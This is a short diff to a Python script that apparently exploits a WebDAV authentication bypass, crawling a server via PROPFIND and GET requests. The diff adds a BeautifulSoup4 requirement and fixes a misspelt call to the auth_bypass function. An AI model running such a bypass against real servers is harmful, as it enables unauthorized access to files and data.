@@ -12,7 +12,7 @@
 #	the server based on the results of a root PROPFIND request.
 # 
 # Requirements: 
-#	Nothing
+#	BeautifulSoup4
 # 
 # TODO:
 #	
@@ -196,7 +196,7 @@ def main():
                                     if link.href.text[-1:] == "/":
                                         resp = auth_bypass(sess,u,'propfind',i,client)
                                     else:
-                                        resp = auth_pypass(sess,u,'get',i,client)
+                                        resp = auth_bypass(sess,u,'get',i,client)
                                     if not resp:
                                         print(bcolors.FAIL + "[!] The server may be patched." + bcolors.ENDC)
                                 else:
